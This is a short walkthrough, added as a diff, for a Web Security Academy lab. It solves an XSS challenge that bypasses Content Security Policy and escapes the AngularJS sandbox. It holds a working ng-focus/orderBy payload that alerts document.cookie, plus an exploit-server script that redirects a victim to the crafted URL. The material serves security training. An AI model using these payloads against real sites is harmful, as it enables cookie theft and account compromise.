@@ -1,0 +1,43 @@
+ This lab uses CSP (Content Security Policy)  and AngularJS.
+
+To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie. 
+
+
+
+First Go to the 
+
+XSS cheat sheet website
+
+AngularJS CSP bypasses
+
+payload:
+
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
+
+Step-1:
+
+we need to add document.cookie in the payload 
+
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
+
+we can add #x to focus on the id we provided x
+
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
+
+after using it in the website url the alert pop up will work
+
+Step-2:
+
+the copy the full url go to the exploit server and paste the following code
+
+https://0a3a0033042343f0818f391000b100d3.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x
+
+like this 
+
+<script>
+location='https://0a3a0033042343f0818f391000b100d3.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+
+
+Click "Store" and "Deliver exploit to victim" and Done
+
